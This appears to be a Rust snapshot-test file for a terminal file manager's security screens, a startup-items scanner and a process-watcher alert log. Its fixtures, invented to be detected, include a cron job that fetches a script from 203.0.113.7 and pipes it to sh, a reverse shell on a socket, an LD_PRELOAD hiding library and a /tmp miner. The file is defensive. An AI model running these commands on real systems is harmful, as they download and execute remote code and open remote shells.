fn typing_cd_lists_the_hotlist_and_recent_folders_above_the_command_line() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.state.folders = folders();
    stage.shell(b"cd ");
    stage.send(key(KeyCode::Up));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Tab Complete · Enter Open")?;
    ensure_text(&buffer, "★ ~/projects/site")?;
    check("cd_picker", &stage, buffer)
}

fn subfolders(dir: &str, names: &[&str]) -> Msg {
    Msg::Subfolders { dir: dir.into(), names: names.iter().map(|name| (*name).to_owned()).collect() }
}

#[test]
fn a_cd_to_a_typed_folder_lists_its_subfolders_first() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.state.folders = folders();
    stage.shell(b"cd ~/projects/");
    stage.send(subfolders("/home/me/projects", &["site", "borg", "notes", "archive"]));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "~/projects/archive")?;
    ensure_text(&buffer, "★ ~/projects/site")?;
    check("cd_picker_subfolders", &stage, buffer)
}

#[test]
fn a_path_in_any_command_lists_its_subfolders_to_complete() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.state.folders = folders();
    stage.shell(b"cp notes.txt /Volumes/");
    stage.send(subfolders("/Volumes", &["Macintosh HD", "Backup", "Photos", ".Trashes"]));
    stage.send(key(KeyCode::Up));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Tab/Enter Complete")?;
    ensure_text(&buffer, "/Volumes/Backup")?;
    check("path_picker", &stage, buffer)
}

#[test]
fn ctrl_backslash_opens_the_folder_hotlist_on_the_panels_folder() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.state.folders = folders();
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('\\'), KeyModifiers::CONTROL)));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Ins Pin")?;
    check("folder_hotlist", &stage, buffer)?;
    for c in "pro".chars() {
        stage.send(key(KeyCode::Char(c)));
    }
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Filter pro")?;
    check("folder_hotlist_filtered", &stage, buffer)
}

#[test]
fn borgs_files_lists_each_place_the_captures_and_what_is_left_over() -> Result<()> {
    use borg_core::{Cleanup, Leftover, Overlay, Place, PlaceUsage, SavedCapture, StorageReport, StorageWindow};
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.send(key(KeyCode::F(9)));
    let options =
        borg_core::menus(&stage.state).iter().position(|menu| menu.title == "Options").context("an Options menu")?;
    while !matches!(&stage.state.overlay, Some(Overlay::Menu(cursor)) if cursor.menu == options) {
        stage.send(key(KeyCode::Right));
    }
    stage.send(key(KeyCode::Up)).send(key(KeyCode::Enter));
    assert!(matches!(stage.state.overlay, Some(Overlay::Storage(StorageWindow { report: None, .. }))));
    ensure_text(&stage.render(stage.started)?, "Measuring…")?;
    let usage =
        |place, path: Option<&str>, bytes, items| PlaceUsage { place, path: path.map(PathBuf::from), bytes, items };
    let saved = at(RECENT).context("a recent time")?;
    let report = StorageReport {
        places: vec![
            usage(Place::Temporary, Some("/run/user/1000/borg-commander"), 19_456, 14),
            usage(Place::Sockets, Some("/tmp/borg-1000-default"), 0, 2),
            usage(Place::Caches, Some("/home/me/.cache/borg-commander"), 24_117_248, 21),
            usage(Place::State, Some("/home/me/.local/state/borg-commander"), 60_416, 18),
            usage(Place::Settings, Some("/home/me/.config/borg-commander"), 342, 2),
            usage(Place::Captures, None, 3_145_728, 2),
        ],
        captures: vec![
            SavedCapture {
                path: "/home/me/projects/borg/capture-20260115-114210.pcapng".into(),
                bytes: 2_097_152,
                saved,
                keys: Some("/home/me/projects/borg/capture-20260115-114210.keylog".into()),
            },
            SavedCapture {
                path: "/home/me/net/capture-20260110-090000.pcap".into(),
                bytes: 1_048_576,
                saved,
                keys: None,
            },
        ],
        leftovers: vec![
            Leftover { path: "/run/user/1000/borg-commander/0.8.3".into(), bytes: 2_744 },
            Leftover { path: "/run/user/1000/borg-commander/0.8.2".into(), bytes: 2_744 },
            Leftover { path: "/home/me/.cache/borg-commander/sizes-ab.json".into(), bytes: 10_011_004 },
            Leftover { path: "/tmp/borg-1000-default/session-default-4242.sock".into(), bytes: 0 },
        ],
        cleaned: Some(Cleanup { at: saved, removed: 12, bytes: 3_145_728, failed: 0 }),
    };
    stage.send(Msg::Storage(report));
    stage.send(key(KeyCode::Down));
    stage.send(key(KeyCode::Down));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Folder sizes and the name index")?;
    check("storage_window", &stage, buffer)?;

    stage.send(key(KeyCode::F(8)));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "2 items in /run/user/1000/borg-commander")?;
    check("storage_clean_question", &stage, buffer)
}

/// Startup items on a made-up Linux machine, newest change first: a boot job that fetches a
/// script, a user service whose program is gone, a preloaded library, an SSH key with a
/// forced command, timers, services and autostart entries.
fn startup_report() -> borg_core::StartupReport {
    use borg_core::{ProgramPresence, RuleHit, StartupEntry, StartupItem, StartupPlace, StartupReport};
    use borg_rules::{Evidence, Level, RuleMatch};
    let at = |stamp: &str| -> SystemTime {
        let stamp: jiff::Timestamp = stamp.parse().unwrap();
        SystemTime::from(stamp)
    };
    let item = |place, file: &str, owner: &str, modified: &str, found: StartupEntry| StartupItem {
        place,
        file: file.into(),
        found,
        owner: Some(owner.into()),
        modified: Some(at(modified)),
        presence: ProgramPresence::Unknown,
        resolved: None,
        hits: Vec::new(),
        read_only: false,
    };
    let entry = |line: Option<usize>, name: &str, runs: &str, program: Option<&str>, when: Option<&str>| StartupEntry {
        line,
        name: name.into(),
        runs: runs.into(),
        program: program.map(str::to_owned),
        when: when.map(str::to_owned),
        ..StartupEntry::default()
    };
    let boot_job = "@reboot curl -s http://203.0.113.7/u.sh | sh";
    let mut fetch = item(
        StartupPlace::Crontab,
        "/var/spool/cron/crontabs/me",
        "me",
        "2026-01-15T09:41:00Z",
        entry(Some(3), "me", "curl -s http://203.0.113.7/u.sh | sh", Some("curl"), Some("@reboot")),
    );
    fetch.presence = ProgramPresence::Present;
    fetch.resolved = Some("/usr/bin/curl".into());
    fetch.hits = vec![RuleHit {
        rule: RuleMatch {
            rule: "reboot_job_fetch".into(),
            namespace: borg_rules::BUILT_IN.into(),
            level: Level::Warning,
            description: None,
            false_positives: None,
            evidence: Some(Evidence {
                string: "$reboot".into(),
                offset: 48,
                length: boot_job.len() as u64,
                bytes: boot_job.as_bytes().to_vec(),
            }),
        },
        in_program: false,
    }];
    let mut helper = item(
        StartupPlace::UserService,
        "/home/me/.config/systemd/user/sync-helper.service",
        "me",
        "2026-01-14T22:03:00Z",
        entry(
            None,
            "sync-helper.service",
            "/home/me/.local/share/.sync/helper --quiet",
            Some("/home/me/.local/share/.sync/helper"),
            Some("default.target"),
        ),
    );
    helper.presence = ProgramPresence::Missing;
    let mut preload = item(
        StartupPlace::Preload,
        "/etc/ld.so.preload",
        "root",
        "2026-01-12T17:20:00Z",
        entry(Some(1), "ld.so.preload", "/usr/local/lib/libhook.so", Some("/usr/local/lib/libhook.so"), None),
    );
    preload.presence = ProgramPresence::Present;
    let mut key = item(
        StartupPlace::AuthorizedKey,
        "/home/me/.ssh/authorized_keys",
        "me",
        "2026-01-10T08:15:00Z",
        entry(
            Some(2),
            "backup@203.0.113.7",
            "command=\"/usr/local/bin/backup-receive\" ssh-ed25519 … backup@203.0.113.7",
            Some("/usr/local/bin/backup-receive"),
            None,
        ),
    );
    key.presence = ProgramPresence::Present;
    let shell = item(
        StartupPlace::ShellStartup,
        "/home/me/.bashrc",
        "me",
        "2025-12-02T19:30:00Z",
        entry(None, ".bashrc", "eval \"$(direnv hook bash)\"", None, None),
    );
    let mut certbot = item(
        StartupPlace::Timer,
        "/etc/systemd/system/certbot.timer",
        "root",
        "2025-11-20T06:00:00Z",
        entry(None, "certbot.timer", "certbot.service", None, Some("OnCalendar=*-*-* 00,12:00:00")),
    );
    certbot.found.user = Some("root".into());
    let mut ssh = item(
        StartupPlace::Service,
        "/lib/systemd/system/ssh.service",
        "root",
        "2025-08-14T11:02:00Z",
        entry(None, "ssh.service", "/usr/sbin/sshd -D $SSHD_OPTS", Some("/usr/sbin/sshd"), Some("multi-user.target")),
    );
    ssh.presence = ProgramPresence::Present;
    let mut chat = item(
        StartupPlace::Autostart,
        "/etc/xdg/autostart/chat.desktop",
        "root",
        "2025-06-02T15:45:00Z",
        entry(None, "Chat", "chat --minimized", Some("chat"), None),
    );
    chat.found.disabled = true;
    StartupReport {
        items: vec![fetch, helper, preload, key, shell, certbot, ssh, chat],
        unread: vec![("/etc/cron.d/backup".into(), "Permission denied (os error 13)".into())],
        problems: Vec::new(),
    }
}

fn open_startup_items(stage: &mut Stage) -> Result<()> {
    let effects = borg_core::update(
        &mut stage.state,
        Msg::Key(KeyEvent::new(KeyCode::Char('u'), KeyModifiers::ALT)),
        stage.started,
    );
    anyhow::ensure!(
        effects.iter().any(|effect| matches!(effect, borg_core::Effect::StartupItems { .. })),
        "opening reads the places"
    );
    Ok(())
}

/// Alt-U reads the places programs start from and lists what it found, newest change first,
/// with the selected item's command, program and the rules it matched beside the list; the
/// filter narrows the list and Alt-W gives it the whole width.
#[test]
fn startup_items_list_what_starts_on_its_own_newest_first() -> Result<()> {
    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
    open_startup_items(&mut stage)?;
    let buffer = stage.render(stage.started + Duration::from_secs(2))?;
    ensure_text(&buffer, "Reading the places programs start from")?;
    check("startup_items_loading", &stage, buffer)?;

    let id = stage.state.startup_items.pending.context("the screen waits for the places")?;
    stage.send(Msg::StartupItems { id, result: Ok(startup_report()) });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "reboot_job_fetch")?;
    ensure_text(&buffer, "/etc/cron.d/backup")?;
    check("startup_items", &stage, buffer)?;

    stage.send(key(KeyCode::Down));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "missing")?;
    check("startup_items_missing_program", &stage, buffer)?;

    stage.send(key(KeyCode::Char('/'))).send(Msg::Paste("root !timer".into()));
    let buffer = stage.render(stage.started)?;
    assert_eq!(stage.state.startup_items.len(), 3, "root's items other than the timer");
    check("startup_items_filter", &stage, buffer)?;

    stage.send(key(KeyCode::Enter)).send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
    let buffer = stage.render(stage.started)?;
    assert!(stage.state.startup_items.expanded, "Alt-W gives the list the whole width");
    check("startup_items_expanded", &stage, buffer)?;

    stage.send(key(KeyCode::Esc)).send(key(KeyCode::Esc));
    assert!(!stage.state.startup_items.is_open(), "Esc clears the filter, then closes the screen");
    Ok(())
}

/// On a narrow screen the list keeps the time, the place and the command and leaves out the
/// columns that do not fit.
#[test]
fn startup_items_drop_columns_on_a_narrow_screen() -> Result<()> {
    let mut stage = stage(GridSize { cols: 80, rows: 28 }, Motion::STILL)?;
    open_startup_items(&mut stage)?;
    let id = stage.state.startup_items.pending.context("the screen waits for the places")?;
    stage.send(Msg::StartupItems { id, result: Ok(startup_report()) });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "2026-01-15 09:41")?;
    check("startup_items_narrow", &stage, buffer)?;
    Ok(())
}

/// Alerts as the watcher would have written them: a remote shell it froze, a program running from
/// a temporary folder, a forced library, a run of discovery commands, and a start left running
/// because somebody may be working in that terminal.
fn alert_log() -> borg_core::AlertLog {
    use borg_core::{
        AlertLog, Allowance, Ancestor, Evidence, ProcessKey, Protection, Response, StartedProcess, StreamKind,
        WatchFinding, WatchSource, WatchStatus,
    };
    let at = |stamp: &str| -> SystemTime {
        let stamp: jiff::Timestamp = stamp.parse().expect("a readable moment");
        SystemTime::from(stamp)
    };
    let parent = |pid: u32, program: &str, terminal: bool| Ancestor {
        pid,
        name: PathBuf::from(program).file_name().expect("a program").to_string_lossy().into_owned(),
        program: Some(program.into()),
        terminal,
        command: program.to_owned(),
        ..Ancestor::default()
    };
    let process = |pid: u32, program: &str, command: &[&str], user: &str, ancestors: Vec<Ancestor>| StartedProcess {
        key: ProcessKey { pid, start: u64::from(pid) * 100 },
        name: PathBuf::from(program).file_name().expect("a program").to_string_lossy().into_owned(),
        program: Some(program.into()),
        command: command.iter().map(|argument| (*argument).to_owned()).collect(),
        user: user.into(),
        ancestors,
        ..StartedProcess::default()
    };
    let learned = at("2026-01-08T09:00:00Z");
    let mut log = AlertLog::watching(WatchStatus {
        source: WatchSource::Kernel,
        since: at("2026-01-01T09:00:00Z"),
        learned_at: learned,
        freeze: true,
        seen: 48_120,
        suppressed: 0,
    });

    let nginx = parent(812, "/usr/sbin/nginx", false);
    let mut shell =
        process(29_314, "/bin/sh", &["sh", "-i"], "www-data", vec![nginx.clone(), parent(1, "/sbin/init", false)]);
    shell.input = StreamKind::Socket;
    shell.output = StreamKind::Socket;
    shell.errors = StreamKind::Socket;
    let id = log.add(
        at("2026-01-15T11:58:12Z"),
        WatchFinding::ShellOnSocket { shell: "sh".into() },
        Response::Frozen,
        shell,
    );
    if let Some(alert) = log.find(id) {
        alert.evidence = Evidence {
            connections: vec!["socket:[412233]".into(), "socket:[412240]".into()],
            program_hash: Some("8c98028bf435d0af5ab8074969a7e4f7e136b30b53df80685e5763ea415d8fbe".into()),
            hits: Vec::new(),
            missing: None,
        };
    }

    let miner = process(29_355, "/tmp/.x/kworker", &["/tmp/.x/kworker", "--quiet"], "www-data", vec![nginx.clone()]);
    log.add(
        at("2026-01-15T11:57:40Z"),
        WatchFinding::ProgramInTempFolder { program: "kworker".into(), folder: "/tmp".into() },
        Response::Frozen,
        miner,
    );

    let curl =
        process(29_301, "/usr/bin/curl", &["curl", "-s", "http://203.0.113.7/u.sh"], "www-data", vec![nginx.clone()]);
    log.add(
        at("2026-01-15T11:55:03Z"),
        WatchFinding::PreloadSet {
            program: "curl".into(),
            variable: "LD_PRELOAD".into(),
            value: "/tmp/libhide.so".into(),
        },
        Response::Alerted,
        curl,
    );

    let python = parent(9_044, "/usr/bin/python3", false);
    let discovery = process(29_288, "/usr/bin/whoami", &["whoami"], "deploy", vec![python]);
    log.add(
        at("2026-01-15T11:40:22Z"),
        WatchFinding::DiscoveryRun { parent: "python3".into(), commands: 4, seconds: 20 },
        Response::Spared(Protection::Terminal),
        discovery,
    );

    let tmux = parent(2_210, "/usr/bin/tmux", true);
    let mut typed = process(28_990, "/bin/bash", &["bash"], "me", vec![tmux]);
    typed.terminal = Some("pts/2".into());
    typed.input = StreamKind::Terminal;
    typed.output = StreamKind::Terminal;
    let id = log.add(
        at("2026-01-14T21:10:00Z"),
        WatchFinding::ParentNeverStartedIt { parent: "tmux".into(), program: "bash".into() },
        Response::Spared(Protection::OnlyANotice),
        typed,
    );
    if let Some(alert) = log.find(id) {
        alert.seen = true;
        alert.state = borg_core::AlertState::Allowed;
    }
    let _ = Allowance::default();
    log
}

fn open_alerts(stage: &mut Stage) -> Result<()> {
    stage.state.settings.preferences.process_watch = true;
    let effects = borg_core::update(
        &mut stage.state,
        Msg::Key(KeyEvent::new(KeyCode::Char('l'), KeyModifiers::ALT)),
        stage.started,
    );
    anyhow::ensure!(
        effects.iter().any(|effect| matches!(effect, borg_core::Effect::Alerts { .. })),
        "opening reads the alert log"
    );
    Ok(())
}

fn send_alerts(stage: &mut Stage) -> Result<()> {
    let id = stage.state.alerts.pending.context("the page waits for its log")?;
    let reply = borg_core::AlertsReply { log: alert_log(), notice: None };
    stage.send(Msg::Alerts { id, result: Ok(reply) });
    Ok(())
}

/// Alt-L opens the Alerts page, newest alert first, with the selected alert's reason, process and
/// evidence beside the list; the filter narrows it and Alt-W gives the list the whole width.
#[test]
fn alerts_list_what_the_process_watcher_found_newest_first() -> Result<()> {
    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
    open_alerts(&mut stage)?;
    let buffer = stage.render(stage.started + Duration::from_secs(2))?;
    ensure_text(&buffer, "Reading the alert log")?;
    check("alerts_loading", &stage, buffer)?;

    send_alerts(&mut stage)?;
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Shell on a network socket")?;
    ensure_text(&buffer, "Frozen")?;
    check("alerts", &stage, buffer)?;

    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "LD_PRELOAD")?;
    check("alerts_preload", &stage, buffer)?;

    stage.send(key(KeyCode::Char('/'))).send(Msg::Paste("www-data !temporary".into()));
    let buffer = stage.render(stage.started)?;
    assert_eq!(stage.state.alerts.len(), 2, "the web server's own alerts other than the temporary folder");
    check("alerts_filter", &stage, buffer)?;

    stage.send(key(KeyCode::Enter)).send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
    let buffer = stage.render(stage.started)?;
    assert!(stage.state.alerts.expanded, "Alt-W gives the list the whole width");
    check("alerts_expanded", &stage, buffer)?;

    stage.send(key(KeyCode::Esc)).send(key(KeyCode::Esc));
    assert!(!stage.state.alerts.is_open(), "Esc clears the filter, then closes the page");
    Ok(())
}

/// K asks before it ends a process, since killing one cannot be taken back.
#[test]
fn alerts_ask_before_killing_a_frozen_process() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    open_alerts(&mut stage)?;
    send_alerts(&mut stage)?;
    stage.send(key(KeyCode::Char('k')));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Kill process")?;
    check("alerts_confirm_kill", &stage, buffer)?;
    Ok(())
}

/// A log Borg could not read was kept aside, and the page says where below the list, the path
/// broken over lines when the pane is narrower.
#[test]
fn alerts_say_where_a_log_borg_could_not_read_went() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    open_alerts(&mut stage)?;
    let id = stage.state.alerts.pending.context("the page waits for its log")?;
    let aside = PathBuf::from(format!("{HOME}/.local/state/borg/{}", borg_core::ALERT_LOG_ASIDE));
    let mut log = alert_log();
    log.alerts.truncate(KEPT_ASIDE_ALERTS);
    log.kept_aside = Some(aside);
    stage.send(Msg::Alerts { id, result: Ok(borg_core::AlertsReply { log, notice: None }) });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "could not read the alert log")?;
    ensure_text(&buffer, "/home/me/.local/state/borg/alerts-unread")?;
    check("alerts_log_kept_aside", &stage, buffer)?;
    Ok(())
}

/// With the watcher turned off the page says how to turn it on, and on a narrow screen the list
/// keeps the time, the rule and the program.
#[test]
fn alerts_say_when_nothing_is_watching_and_drop_columns_on_a_narrow_screen() -> Result<()> {
    let mut stage = stage(GridSize { cols: 80, rows: 20 }, Motion::STILL)?;
    let effects = borg_core::update(
        &mut stage.state,
        Msg::Key(KeyEvent::new(KeyCode::Char('l'), KeyModifiers::ALT)),
        stage.started,
    );
    let id = effects
        .iter()
        .find_map(|effect| match effect {
            borg_core::Effect::Alerts { id, .. } => Some(*id),
            _ => None,
        })
        .context("opening reads the alert log")?;
    let empty = borg_core::AlertsReply { log: borg_core::AlertLog::default(), notice: None };
    stage.send(Msg::Alerts { id, result: Ok(empty) });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Watch")?;
    check("alerts_watcher_off", &stage, buffer)?;

    stage.state.settings.preferences.process_watch = true;
    stage.send(key(KeyCode::Char('r')));
    send_alerts(&mut stage)?;
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "11:58")?;
    check("alerts_narrow", &stage, buffer)?;
    Ok(())
}

fn start_sessions() -> Vec<borg_core::SessionEntry> {
    let entry = |id: &str, name: &str, used: Option<SystemTime>, in_use| borg_core::SessionEntry {
        id: id.into(),
        name: name.into(),
        last_used: used,
        in_use,
    };
    vec![
        entry(borg_core::DEFAULT_SESSION, "Default", at(RECENT - 3_600), Some(borg_core::SessionUse::Terminal)),
        entry("8f3c2a", "web", at(RECENT), Some(borg_core::SessionUse::Service)),
        entry("41d9e0", "scratch", at(OLD), None),
        entry("c07b55", "migration-2024", None, None),
    ]
}

/// The window Borg opens on start, drawn on a screen of `size` in the default theme and checked
/// against the snapshot `name`.
fn start_window(name: &str, picker: &borg_core::SessionPicker, size: GridSize) -> Result<Buffer> {
    let stage = stage(size, Motion::STILL)?;
    let look = borg_ui::StartLook { theme: stage.themes.find(None), palette: &stage.palette, truecolor: true };
    let mut buffer = Buffer::empty(ratatui::layout::Rect::new(0, 0, size.cols, size.rows));
    borg_ui::draw_session_picker(picker, &look, &stage.clock, &mut buffer);
    check(name, &stage, buffer.clone())?;
    Ok(buffer)
}

fn picker_key(picker: &mut borg_core::SessionPicker, code: KeyCode) -> Option<borg_core::SessionChoice> {
    picker.update(borg_core::PickerInput::Key(KeyEvent::new(code, KeyModifiers::NONE)))
}

/// The window says what a session is, marks the sessions another terminal or the service runs,
/// says why those stay, and asks before removing an old one with No chosen.
#[test]
fn start_window_marks_active_sessions_and_asks_before_removing_an_old_one() -> Result<()> {
    let mut picker = borg_core::SessionPicker::new(start_sessions());
    let buffer = start_window("start_sessions", &picker, SIZE)?;
    ensure_text(&buffer, "A session is a saved workspace")?;
    ensure_text(&buffer, "● Kept running by the service")?;
    ensure_text(&buffer, "● Open in another terminal")?;
    ensure_text(&buffer, "2024-06-01")?;

    picker_key(&mut picker, KeyCode::F(8));
    let buffer = start_window("start_sessions_kept_by_service", &picker, SIZE)?;
    ensure_text(&buffer, "service attach NAME")?;

    picker_key(&mut picker, KeyCode::Down);
    picker_key(&mut picker, KeyCode::Down);
    start_window("start_sessions_idle", &picker, SIZE)?;
    picker_key(&mut picker, KeyCode::F(8));
    let buffer = start_window("start_sessions_remove_confirm", &picker, SIZE)?;
    ensure_text(&buffer, "Remove session \"scratch\"?")?;
    assert_eq!(picker_key(&mut picker, KeyCode::Enter), None, "No is chosen first");
    Ok(())
}

#[test]
fn start_window_names_a_new_session_and_fits_a_narrow_screen() -> Result<()> {
    let mut picker = borg_core::SessionPicker::new(start_sessions());
    picker_key(&mut picker, KeyCode::F(7));
    for letter in "web".chars() {
        picker_key(&mut picker, KeyCode::Char(letter));
    }
    picker_key(&mut picker, KeyCode::Enter);
    let buffer = start_window("start_sessions_name_taken", &picker, SIZE)?;
    ensure_text(&buffer, "A session named \"web\" already exists.")?;
    start_window("start_sessions_narrow", &borg_core::SessionPicker::new(start_sessions()), NARROW)?;
    Ok(())
}
